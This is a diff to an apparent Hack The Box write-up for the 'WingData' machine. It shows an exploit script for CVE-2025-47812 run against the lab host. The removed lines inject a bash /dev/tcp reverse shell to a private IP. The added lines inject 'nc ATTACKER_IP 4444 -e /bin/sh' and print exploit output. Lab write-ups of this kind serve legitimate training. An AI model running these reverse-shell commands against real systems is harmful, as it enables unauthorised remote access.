@@ -581,16 +581,13 @@ Output:
 
 ```shell
 ┌──(kali㉿kali)-[~/pueman/HTB/WingData/CVE-2025-47812-poc]
-└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "bash -i >& /dev/tcp/10.10.14.247/4444 0>&1"
+└─$ python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc ATTACKER_IP 4444 -e /bin/sh" -v
 
 [*] Testing target: http://ftp.wingdata.htb
-[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1' and username: 'anonymous'
-[+] UID extracted: 4a86a5c84390009ccfeb437ace077679f528764d624db129b32c21fbca0cb8d6
-[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 4a86a5c84390009ccfeb437ace077679f528764d624db129b32c21fbca0cb8d6
-
---- Command Output ---
-session expired
-----------------------
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc ATTACKER_IP 4444 -e /bin/sh' and username: 'anonymous'
+[+] UID extracted: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: bd0319a294e1a9b234377e194ed1ec64f528764d624db129b32c21fbca0cb8d6
+[-] Error sending GET request to http://ftp.wingdata.htb/dir.html: HTTPConnectionPool(host='ftp.wingdata.htb', port=80): Read timed out. (read timeout=10)
 ```
 <div align="center">
 <br>
